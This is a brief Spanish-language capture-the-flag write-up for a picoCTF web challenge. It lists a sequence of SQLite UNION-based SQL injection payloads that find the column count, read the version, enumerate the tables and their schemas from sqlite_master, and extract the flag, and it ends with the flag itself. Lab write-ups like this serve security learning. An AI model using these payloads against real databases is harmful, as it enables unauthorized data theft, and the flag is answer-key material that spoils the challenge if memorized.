## Descripción 
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:63105/).
## Solución 
```
ciudad' union select 1,2,3;
ciudad' union select sqlite_version(),2,3;
ciudad' union select 1,2,tbl_name FROM sqlite_master WHERE type='table' ;
ciudad' union select 1,sql,tbl_name FROM sqlite_master WHERE type='table' ;
ciudad' union select 1,2,flag from more_table;


```

picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}
## Notas
## Referencias
